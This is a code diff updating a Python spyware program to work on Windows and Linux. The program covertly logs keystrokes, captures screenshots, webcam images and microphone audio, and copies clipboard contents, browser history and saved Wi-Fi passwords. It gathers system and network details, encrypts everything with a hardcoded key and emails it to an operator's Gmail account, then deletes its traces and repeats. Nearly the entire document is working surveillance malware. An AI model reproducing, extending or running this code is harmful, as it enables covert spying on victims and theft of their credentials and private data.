@@ -1,3 +1,8 @@
+# This tool may be used for legal purposes only.  Users take full responsibility
+# for any actions performed using this tool.  The author accepts no liability
+# for damage caused by this tool.  If these terms are not acceptable to you, then
+# do not use this tool.
+
 # Built-in Modules #
 import json
 import logging
@@ -7,121 +12,115 @@ import re
 import shutil
 import smtplib
 import socket
-import subprocess
+import sys
 import time
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from multiprocessing import Process
+from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
+from threading import Thread
 
 # External Modules #
+import browserhistory as bh
 import cv2
 import requests
 import sounddevice
-import win32clipboard
-import browserhistory as bh
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
 from pynput.keyboard import Listener
-from scipy.io.wavfile import write as write_rec
+# from scipy.io.wavfile import write as write_rec
+
+# If the OS is Windows #
+if os.name == 'nt':
+    import win32clipboard
 
 
-# Logs the current key pressed #
-def on_press(key): return logging.info(str(key))
+'''
+################
+Function Index #
+########################################################################################################################
+SmtpHandler - Facilitates sending the emails with the encrypted data to be exfiltrated.
+EmailAttach - Creates email attach object and returns it.
+EmailHeader - Format email header and body.
+SendMail - Facilitates sending emails in a segmented fashion based on regex matches.
+Webcam - Captures webcam pictures every five seconds.
+Microphone - Actively records microphone in 60 second intervals.
+Screenshot - Captured screenshots every five seconds.
+LogKeys - Detect and log keys pressed by the user.
+PrintErr - Displays the passed in error message via stderr.
+main - Gathers network information, clipboard contents, browser history, initiates multiprocessing, sends encrypted \
+       results, cleans up exfiltrated data, and loops back to the beginning.
+########################################################################################################################
+'''
 
 
 '''
 ########################################################################################################################
-Name:       LoggKeys
-Purpose:    Detect and log keys pressed by the user.
-Parameters: The file path where the logs will be stored.
-Returns:    None
+Name:       SmtpHandler
+Purpose:    Facilitates sending the emails with the encrypted data to be exfiltrated.
+Parameters: The email address, password, and the email to be sent.
+Returns:    Nothing
 ########################################################################################################################
 '''
-def LoggKeys(file_path):
-    # Set the log file and format #
-    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
-                        format='%(asctime)s: %(message)s')
+def SmtpHandler(email_address: str, password: str, email):
+    try:
+        # Initiate Gmail SMTP session #
+        with smtplib.SMTP('smtp.gmail.com', 587) as session:
+            # Upgrade the session to TLS encryption #
+            session.starttls()
+            # Login to Gmail account #
+            session.login(email_address, password)
+            # Send the email and exit session #
+            session.sendmail(email_address, email_address, email.as_string())
+            session.quit()
 
-    # on_press = lambda Key : logging.info(str(Key))
-
-    # Join the keystroke listener thread #
-    with Listener(on_press=on_press) as listener:
-        listener.join()
-
-
-'''
-########################################################################################################################
-Name:       Screenshot
-Purpose:    Captured screenshots every five seconds.
-Parameters: The file path where the logs will be stored.
-Returns:    None
-########################################################################################################################
-'''
-def Screenshot(file_path):
-    # Create directory for screenshot storage #
-    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
-    screen_path = f'{file_path}Screenshots\\'
-
-    for x in range(0, 60):
-        # Capture screenshot #
-        pic = ImageGrab.grab()
-        # Save screenshot to file #
-        pic.save(f'{screen_path}screenshot{x}.png')
-        time.sleep(5)
+    # If SMTP or socket related error occurs #
+    except (OSError, smtplib.SMTPException) as mail_err:
+        PrintErr(f'Error occurred during email session: {mail_err}')
+        logging.exception(f'Error occurred during email session: {mail_err}\n\n')
 
 
 '''
 ########################################################################################################################
-Name:       Microphone
-Purpose:    Actively records microphone in 60 second intervals.
-Parameters: The file path where the logs will be stored.
-Returns:    None
+Name:       EmailAttach
+Purpose:    Creates email attach object and returns it.
+Parameters: The path and file to be attached.
+Returns:    The populated email attachment instance.
 ########################################################################################################################
 '''
-def Microphone(file_path):
-    for x in range(0, 5):
-        fs = 44100
-        seconds = 60
-        my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sounddevice.wait()
-        write_rec(f'{file_path}{x}mic_recording.wav', fs, my_recording)
+def EmailAttach(path: str, attach_file: str):
+    # Create the email attachment object #
+    attach = MIMEBase('application', "octet-stream")
 
+    # If the OS is Windows #
+    if os.name == 'nt':
+        attach_path = f'{path}\\{attach_file}'
+    # If the OS is Linux #
+    else:
+        attach_path = f'{path}/{attach_file}'
 
-'''
-########################################################################################################################
-Name:       Webcam
-Purpose:    Captures webcam pictures every five seconds.
-Parameters: The file path where the logs will be stored.
-Returns:    None
-########################################################################################################################
-'''
-def Webcam(file_path):
-    # Create directory for webcam picture storage #
-    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
-    cam_path = f'{file_path}WebcamPics\\'
-    cam = cv2.VideoCapture(0)
+    # Set file content as attachment payload #
+    with open(attach_path, 'rb') as attachment:
+        attach.set_payload(attachment.read())
 
-    for x in range(0, 60):
-        ret, img = cam.read()
-        file = f'{cam_path}{x}.jpg'
-        cv2.imwrite(file, img)
-        time.sleep(5)
-
-    cam.release()
-    cv2.destroyAllWindows()
+    # Encode attachment file in base64 #
+    encoders.encode_base64(attach)
+    # Add header to attachment object #
+    attach.add_header('Content-Disposition', f'attachment;filename = {attach_file}')
+    return attach
 
 
 '''
 ########################################################################################################################
-Name:       EmailBase
+Name:       EmailHeader
 Purpose:    Format email header and body.
 Parameters: The email message and the email address associated with the message.
 Returns:    The email message.
 ########################################################################################################################
 '''
-def EmailBase(message, email_address):
+def EmailHeader(message, email_address: str):
     message['From'] = email_address
     message['To'] = email_address
     message['Subject'] = 'Success!!!'
@@ -132,76 +131,203 @@ def EmailBase(message, email_address):
 
 '''
 ########################################################################################################################
-Name:       SmtpHandler
-Purpose:    Facilitates sending the emails with the encrypted data to be exfiltrated.
-Parameters: The email address, password, and the email to be sent.
-Returns:    None
-########################################################################################################################
-'''
-def SmtpHandler(email_address, password, email):
-    try:
-        s = smtplib.SMTP('smtp.gmail.com', 587)
-        s.starttls()
-        s.login(email_address, password)
-        s.sendmail(email_address, email_address, email.as_string())
-        s.quit()
-    except smtplib.SMTPException:
-        pass
-
-
-'''
-########################################################################################################################
 Name:       SendMail
 Purpose:    Facilitates sending emails in a segmented fashion based on regex matches.
-Parameters: The path where the files to emailed are stored.
-Returns:    None
+Parameters: The path where the files to be emailed are stored and various compiled regex for matching attachment files.
+Returns:    Nothing
 ########################################################################################################################
 '''
-def SendMail(path):
-    regex = re.compile(r'.+\.xml$')
-    regex2 = re.compile(r'.+\.txt$')
-    regex3 = re.compile(r'.+\.png$')
-    regex4 = re.compile(r'.+\.jpg$')
-    regex5 = re.compile(r'.+\.wav$')
+def SendMail(path: str, re_xml, re_txt, re_png, re_jpg, re_wav):
+    # User loging information #
+    email_address = ''          # <--- Enter your email address
+    password = ''               # <--- Enter email password
 
-    email_address = ''  # <--- Enter your email address
-    password = ''  # <--- Enter email password
-
+    # Create message object with text and attachments #
     msg = MIMEMultipart()
-    EmailBase(msg, email_address)
+    # Format email header #
+    EmailHeader(msg, email_address)
 
-    exclude = {'Screenshots', 'WebcamPics'}
-    for dir_path, dir_names, file_names in os.walk(path, topdown=True):
-        dir_names[:] = [d for d in dir_names if d not in exclude]
-        for file in file_names:
-            if regex.match(file) or regex2.match(file) \
-                    or regex3.match(file) or regex4.match(file):
+    # Iterate through files of passed in directory #
+    for file in os.scandir(path):
+        # If current item is dir #
+        if os.path.isdir(file.name):
+            continue
 
-                p = MIMEBase('application', "octet-stream")
-                with open(path + '\\' + file, 'rb') as attachment:
-                    p.set_payload(attachment.read())
-                encoders.encode_base64(p)
-                p.add_header('Content-Disposition', 'attachment;'
-                                                    'filename = {}'.format(file))
-                msg.attach(p)
+        # If the file matches file extension regex's #
+        if re_xml.match(file.name) or re_txt.match(file.name) \
+        or re_png.match(file.name) or re_jpg.match(file.name):
+            # Turn file into email attachment #
+            attachment = EmailAttach(path, file.name)
+            # Attach file to email message #
+            msg.attach(attachment)
 
-            elif regex5.match(file):
-                msg_alt = MIMEMultipart()
-                EmailBase(msg_alt, email_address)
-                p = MIMEBase('application', "octet-stream")
-                with open(path + '\\' + file, 'rb') as attachment:
-                    p.set_payload(attachment.read())
-                encoders.encode_base64(p)
-                p.add_header('Content-Disposition', 'attachment;'
-                                                    'filename = {}'.format(file))
-                msg_alt.attach(p)
-
-                SmtpHandler(email_address, password, msg_alt)
-
-            else:
-                pass
+        elif re_wav.match(file.name):
+            # Create alternate message object for wav files #
+            msg_alt = MIMEMultipart()
+            # Format message header #
+            EmailHeader(msg_alt, email_address)
+            # Turn file into email attachment #
+            attachment = EmailAttach(path, file.name)
+            # Attach file to alternate email message #
+            msg_alt.attach(attachment)
+            # Send alternate email message #
+            SmtpHandler(email_address, password, msg_alt)
 
     SmtpHandler(email_address, password, msg)
+
+
+'''
+########################################################################################################################
+Name:       Webcam
+Purpose:    Captures webcam pictures every five seconds.
+Parameters: The file path where the logs will be stored.
+Returns:    Nothing
+########################################################################################################################
+'''
+def Webcam(file_path: str):
+    # If the OS is Windows #
+    if os.name == 'nt':
+        # Create directory for webcam picture storage #
+        cam_path = f'{file_path}\\WebcamPics'
+        pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
+    # If the OS is Linux #
+    else:
+        # Create directory for webcam picture storage #
+        cam_path = f'{file_path}/WebcamPics'
+        pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)
+
+    # Initialize video capture instance #
+    cam = cv2.VideoCapture(0)
+
+    for x in range(0, 60):
+        # Take picture of current webcam view #
+        ret, img = cam.read()
+
+        # If the OS is Windows #
+        if os.name == 'nt':
+            file = f'{cam_path}\\{x}webcam.jpg'
+        # If the OS is Linux #
+        else:
+            file = f'{cam_path}/{x}webcam.jpg'
+
+        # Save the image to as file #
+        cv2.imwrite(file, img)
+        # Sleep process 5 seconds #
+        time.sleep(5)
+
+    # Release camera control #
+    cam.release()
+
+
+'''
+########################################################################################################################
+Name:       Microphone
+Purpose:    Actively records microphone in 60 second intervals.
+Parameters: The file path where the logs will be stored.
+Returns:    Nothing
+########################################################################################################################
+'''
+def Microphone(file_path: str):
+    # Import sound recording module in private thread #
+    from scipy.io.wavfile import write as write_rec
+    # Set recording frames-per-second and duration #
+    fs = 44100
+    seconds = 60
+
+    for x in range(0, 5):
+        # If the OS is Windows #
+        if os.name == 'nt':
+            # Initialize instance for microphone recording #
+            my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+        # If the OS is Linux #
+        else:
+            # Initialize instance for microphone recording #
+            my_recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=1)
+
+        # Wait time interval for the mic to record #
+        sounddevice.wait()
+
+        # If the OS is Windows #
+        if os.name == 'nt':
+            # Save the recording as wav file #
+            write_rec(f'{file_path}\\{x}mic_recording.wav', fs, my_recording)
+        # If the OS is Linux #
+        else:
+            # Save the recording as mp4 file #
+            write_rec(f'{file_path}/{x}mic_recording.mp4', fs, my_recording)
+
+
+'''
+########################################################################################################################
+Name:       Screenshot
+Purpose:    Captured screenshots every five seconds.
+Parameters: The file path where the logs will be stored.
+Returns:    Nothing
+########################################################################################################################
+'''
+def Screenshot(file_path: str):
+    # If the OS is Windows #
+    if os.name == 'nt':
+        # Create directory for screenshot storage #
+        screen_path = f'{file_path}\\Screenshots'
+        pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
+    # If the OS is Linux #
+    else:
+        # Create directory for screenshot storage #
+        screen_path = f'{file_path}/Screenshots'
+        pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)
+
+    for x in range(0, 60):
+        # Capture screenshot #
+        pic = ImageGrab.grab()
+
+        # If the OS is Windows #
+        if os.name == 'nt':
+            # Save screenshot to file #
+            pic.save(f'{screen_path}\\{x}screenshot.png')
+        # If the OS is Linux #
+        else:
+            # Save screenshot to file #
+            pic.save(f'{screen_path}/{x}screenshot.png')
+
+        time.sleep(5)
+
+
+'''
+########################################################################################################################
+Name:       LogKeys
+Purpose:    Detect and log keys pressed by the user.
+Parameters: The file path where the logs will be stored.
+Returns:    Nothing
+########################################################################################################################
+'''
+def LogKeys(file_path: str):
+    # If the OS is Windows #
+    if os.name == 'nt':
+        # Set the log file and format #
+        logging.basicConfig(filename=f'{file_path}\\key_logs.txt', level=logging.DEBUG,
+                            format='%(asctime)s: %(message)s')
+    # If the OS is Linux #
+    else:
+        # Set the log file and format #
+        logging.basicConfig(filename=f'{file_path}/key_logs.txt', level=logging.DEBUG,
+                            format='%(asctime)s: %(message)s')
+
+    # Join the keystroke listener thread #
+    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
+        listener.join()
+
+
+'''
+########################################################################################################################
+Name:       PrintErr
+Purpose:    Displays the passed in error message via stderr.
+Parameters: The error message to be displayed.
+Returns:    Nothing
+########################################################################################################################
+'''
+def PrintErr(msg: str):
+    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)
 
 
 '''
@@ -209,78 +335,196 @@ def SendMail(path):
 Name:       main
 Purpose:    Gathers network information, clipboard contents, browser history, initiates multiprocessing, sends \
             encrypted results, cleans up exfiltrated data, and loops back to the beginning.
-Parameters: None
-Returns:    None
+Parameters: Nothing
+Returns:    Nothing
 ########################################################################################################################
 '''
 def main():
-    # Create storage for exfiltrated data #
-    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
-    file_path = 'C:\\Users\\Public\\Logs\\'
+    # If the OS is Windows #
+    if os.name == 'nt':
+        export_path = 'C:\\Tmp'
+        # Ensure the tmp exfiltration dir exists #
+        pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)
 
-    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
-        commands = subprocess.Popen(['Netsh', 'WLAN', 'export', 'profile',
-                                     'folder=C:\\Users\\Public\\Logs\\', 'key=clear',
-                                     '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
-                                     'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'],
-                                    stdout=network_wifi, stderr=network_wifi, shell=True)
+        # Format program file names #
+        network_file = f'{export_path}\\network_info.txt'
+        sysinfo_file = f'{export_path}\\system_info.txt'
+        browser_file = f'{export_path}\\browser_info.txt'
+
+    # If the OS is Linux #
+    else:
+        export_path = '/tmp/logs'
+        # Ensure the tmp exfiltration dir exists #
+        pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)
+
+        # Format program file names #
+        network_file = f'{export_path}/network_info.txt'
+        sysinfo_file = f'{export_path}/system_info.txt'
+        browser_file = f'{export_path}/browser_info.txt'
+
+    try:
+        # Open the network information file in write mode and log file in write mode #
+        with open(network_file, 'w') as network_io:
+            # If the OS is Windows #
+            if os.name == 'nt':
+                # Get the saved Wi-Fi network information, IP configuration, ARP table,
+                # MAC address, routing table, and active TCP/UDP ports #
+                commands = Popen(['Netsh', 'WLAN', 'export', 'profile', f'folder={export_path}', 'key=clear',
+                                  '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route',
+                                  'print', '&', 'netstat', '-a'], stdout=network_io, stderr=network_io, shell=True)
+            # If the OS is Linux #
+            else:
+                cmd0 = 'ifconfig'
+                cmd1 = 'arp -a'
+                cmd2 = 'route'
+                cmd3 = 'netstat -a'
+
+                # Get the IP configuration & MAC address, ARP table, routing table, and active TCP/UDP ports #
+                commands = Popen(f'{cmd0}; {cmd1}; {cmd2}; {cmd3}',
+                                 stdout=network_io, stderr=network_io, shell=True)
+
+            try:
+                # Execute child process #
+                commands.communicate(timeout=60)
+
+            # If execution timeout occurred #
+            except TimeoutExpired:
+                commands.kill()
+                commands.communicate()
+
+    # If IO error occurs with file #
+    except (OSError, IOError) as file_err:
+        PrintErr(f'Error occurred during file operation: {file_err}')
+        logging.exception(f'Error occurred during file operation: {file_err}\n\n')
+
+    # If the OS is Linux #
+    if os.name != 'nt':
         try:
-            commands.communicate(timeout=60)
+            # Open the network SSID list file in write mode #
+            with open(f'{export_path}/wifi_info.txt', 'w') as wifi_list:
+                try:
+                    # Get the available Wi-Fi networks with  nmcli #
+                    get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
 
-        except subprocess.TimeoutExpired:
-            commands.kill()
-            commands.communicate()
+                # If error occurs during process #
+                except CalledProcessError as proc_err:
+                    logging.exception(f'Error occurred during Wi-Fi SSID list retrieval: {proc_err}\n\n')
+
+                # If an SSID id list was successfully retrieved #
+                if get_wifis:
+                    # Iterate through command result line by line #
+                    for wifi in get_wifis.decode().split('\n'):
+                        # If not a wired connection #
+                        if 'Wired' not in wifi:
+                            try:
+                                command = Popen(f'nmcli -s connection show {wifi}',
+                                                stdout=wifi_list, stderr=wifi_list, shell=True)
+                                # Execute child process #
+                                command.communicate(timeout=60)
+
+                            # If process error or timeout occurs #
+                            except TimeoutExpired:
+                                command.kill()
+                                command.communicate()
+
+        # If IO error during file operation #
+        except (IOError, OSError) as file_err:
+            PrintErr(f'Error occurred during file operation: {file_err}')
+            logging.exception(f'Error occurred during file operation: {file_err}\n\n')
 
     # Get the hostname #
     hostname = socket.gethostname()
     # Get the IP address by hostname #
     ip_addr = socket.gethostbyname(hostname)
 
-    with open(file_path + 'system_info.txt', 'a') as system_info:
+    try:
+        with open(sysinfo_file, 'a') as system_info:
+            try:
+                # Query ipify API to retrieve public IP #
+                public_ip = requests.get('https://api.ipify.org').text
+
+            # If error occurs querying public IP #
+            except requests.ConnectionError as conn_err:
+                public_ip = f'* Ipify connection failed: {conn_err} *'
+
+            # Log the public and private IP address #
+            system_info.write(f'Public IP Address: {public_ip}\nPrivate IP Address: {str(ip_addr)}\n')
+
+            # If the OS is Windows #
+            if os.name == 'nt':
+                get_sysinfo = Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'],
+                                    stdout=system_info, stderr=system_info, shell=True)
+            # If the OS is Linux #
+            else:
+                cmd0 = 'hostnamectl'
+                cmd1 = 'lscpu'
+                cmd2 = 'lsmem'
+                cmd3 = 'lsusb'
+                cmd4 = 'lspci'
+                cmd5 = 'lshw'
+                cmd6 = 'lsblk'
+                cmd7 = 'df -h'
+
+                get_sysinfo = Popen(f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}',
+                                    stdout=system_info, stderr=system_info, shell=True)
+
+            try:
+                get_sysinfo.communicate(timeout=30)
+
+            except TimeoutExpired:
+                get_sysinfo.kill()
+                get_sysinfo.communicate()
+
+    # If IO error during file operation #
+    except (IOError, OSError) as file_err:
+        PrintErr(f'Error occurred during file operation: {file_err}')
+        logging.exception(f'Error occurred during file operation: {file_err}\n\n')
+
+    # If OS is Windows #
+    if os.name == 'nt':
+        # Copy the clipboard #
+        win32clipboard.OpenClipboard()
+        pasted_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+
         try:
-            # Query ipify API to retrieve public IP #
-            public_ip = requests.get('https://api.ipify.org').text
-        except requests.ConnectionError:
-            public_ip = '* Ipify connection failed *'
-            pass
+            # Write the clipboard contents to output file #
+            with open(f'{export_path}\\clipboard_info.txt', 'w') as clipboard_info:
+                clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
 
-        # Log the public and private IP address #
-        system_info.write(f'Public IP Address: {public_ip}\nPrivate IP Address: {str(ip_addr)}\n')
+        # If IO error during file operation #
+        except (IOError, OSError) as file_err:
+            PrintErr(f'Error occurred during file operation: {file_err}')
+            logging.exception(f'Error occurred during file operation: {file_err}\n\n')
 
-        get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], stdout=system_info,
-                                       stderr=system_info, shell=True)
-        try:
-            get_sysinfo.communicate(timeout=15)
-
-        except subprocess.TimeoutExpired:
-            get_sysinfo.kill()
-            get_sysinfo.communicate()
-
-    # Copy the clipboard #
-    win32clipboard.OpenClipboard()
-    pasted_data = win32clipboard.GetClipboardData()
-    win32clipboard.CloseClipboard()
-
-    with open(f'{file_path}clipboard_info.txt', 'a') as clipboard_info:
-        clipboard_info.write('Clipboard Data: \n' + pasted_data)
-
-    # Get the browsing history #
-    browser_history = []
+    # Get the browser's username #
     bh_user = bh.get_username()
+    # Gets path to database of browser #
     db_path = bh.get_database_paths()
+    # Retrieves the user history #
     hist = bh.get_browserhistory()
+    # Append the results into one list #
+    browser_history = []
     browser_history.extend((bh_user, db_path, hist))
-    with open(file_path + 'browser.txt', 'a') as browser_txt:
-        browser_txt.write(json.dumps(browser_history))
+
+    try:
+        # Write the results to output file in json format #
+        with open(browser_file, 'w') as browser_txt:
+            browser_txt.write(json.dumps(browser_history))
+
+    # If IO error during file operation #
+    except (IOError, OSError) as file_err:
+        PrintErr(f'Error occurred during file operation: {file_err}')
+        logging.exception(f'Error occurred during file operation: {file_err}\n\n')
 
     # Create and start processes #
-    p1 = Process(target=LoggKeys, args=(file_path,))
+    p1 = Process(target=LogKeys, args=(export_path,))
     p1.start()
-    p2 = Process(target=Screenshot, args=(file_path,))
+    p2 = Process(target=Screenshot, args=(export_path,))
     p2.start()
-    p3 = Process(target=Microphone, args=(file_path,))
+    p3 = Thread(target=Microphone, args=(export_path,))
     p3.start()
-    p4 = Process(target=Webcam, args=(file_path,))
+    p4 = Process(target=Webcam, args=(export_path,))
     p4.start()
 
     # Join processes with 5 minute timeout #
@@ -292,43 +536,86 @@ def main():
     # Terminate processes #
     p1.terminate()
     p2.terminate()
-    p3.terminate()
     p4.terminate()
 
-    files = ['network_wifi.txt', 'system_info.txt', 'clipboard_info.txt',
-             'browser.txt', 'key_logs.txt']
+    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']
+    # Compile xml regex #
+    re_xml = re.compile(r'.{1,255}\.xml$')
 
-    regex = re.compile(r'.+\.xml$')
-    dir_path = 'C:\\Users\\Public\\Logs'
+    # If the OS is Windows #
+    if os.name == 'nt':
+        # Add clipboard file to list #
+        files.append('clipboard_info.txt')
 
-    for _, _, filenames in os.walk(dir_path):
-        [files.append(file) for file in filenames if regex.match(file)]
+        # Append file to file list if item is file and match xml regex #
+        [files.append(file.name) for file in os.scandir(export_path) if re_xml.match(file.name)]
+    # If the OS is Linux #
+    else:
+        files.append('wifi_info.txt')
 
     # In the python console type: from cryptography.fernet import Fernet ; then run the command
     # below to generate a key. This key needs to be added to the key variable below as
-    # well as in the DecryptFile.py that should be kept on the exploiters system. If either
+    # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
     # is forgotten either encrypting or decrypting process will fail. #
     # Command -> Fernet.generate_key()
     key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
 
+    # Iterate through files to be encrypted #
     for file in files:
-        with open(file_path + file, 'rb') as plain_text:
-            data = plain_text.read()
+        # If the OS is Windows #
+        if os.name == 'nt':
+            plain_path = f'{export_path}\\{file}'
+            crypt_path = f'{export_path}\\e_{file}'
+        else:
+            plain_path = f'{export_path}/{file}'
+            crypt_path = f'{export_path}/e_{file}'
 
-        encrypted = Fernet(key).encrypt(data)
+        try:
+            # Read the file plain text data #
+            with open(plain_path, 'rb') as plain_text:
+                data = plain_text.read()
 
-        with open(file_path + 'e_' + file, 'ab') as hidden_data:
-            hidden_data.write(encrypted)
+            # Encrypt the file data #
+            encrypted = Fernet(key).encrypt(data)
 
-        os.remove(file_path + file)
+            # Write the encrypted data to fresh file #
+            with open(crypt_path, 'wb') as hidden_data:
+                hidden_data.write(encrypted)
+
+            # Delete the plain text data #
+            os.remove(plain_path)
+
+        # If error occurs during file operation #
+        except (IOError, OSError) as file_err:
+            PrintErr(f'Error occurred during file operation: {file_err}')
+            logging.exception(f'Error occurred during file operation: {file_err}\n\n')
+
+    # Compile regex's for attaching files #
+    re_txt = re.compile(r'.{1,255}\.txt$')
+    re_png = re.compile(r'.{1,255}\.png$')
+    re_jpg = re.compile(r'.{1,255}\.jpg$')
+
+    # If the OS is Windows #
+    if os.name == 'nt':
+        re_audio = re.compile(r'.{1,255}\.wav$')
+    # If the OS is Linux #
+    else:
+        re_audio = re.compile(r'.{1,255}\.mp4')
 
     # Exfiltrate encrypted results via email #
-    SendMail('C:\\Users\\Public\\Logs')
-    SendMail('C:\\Users\\Public\\Logs\\Screenshots')
-    SendMail('C:\\Users\\Public\\Logs\\WebcamPics')
+    SendMail(export_path, re_xml, re_txt, re_png, re_jpg, re_audio)
+
+    # If the OS is Windows #
+    if os.name == 'nt':
+        SendMail(f'{export_path}\\Screenshots', re_xml, re_txt, re_png, re_jpg, re_audio)
+        SendMail(f'{export_path}\\WebcamPics', re_xml, re_txt, re_png, re_jpg, re_audio)
+    # If the OS Linux #
+    else:
+        SendMail(f'{export_path}/Screenshots', re_xml, re_txt, re_png, re_jpg, re_audio)
+        SendMail(f'{export_path}/WebcamPics', re_xml, re_txt, re_png, re_jpg, re_audio)
 
     # Clean Up Files #
-    shutil.rmtree('C:\\Users\\Public\\Logs')
+    shutil.rmtree(export_path)
 
     # Loop #
     main()
@@ -338,10 +625,13 @@ if __name__ == '__main__':
     try:
         main()
 
+    # If Ctrl + C is detected #
     except KeyboardInterrupt:
         print('* Control-C entered...Program exiting *')
 
+    # If unknown exception occurs #
     except Exception as ex:
-        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
-        logging.exception(f'* Error Occurred: {ex} *')
-        pass
+        PrintErr(f'Unknown exception occurred: {ex}')
+        sys.exit(1)
+
+    sys.exit(0)
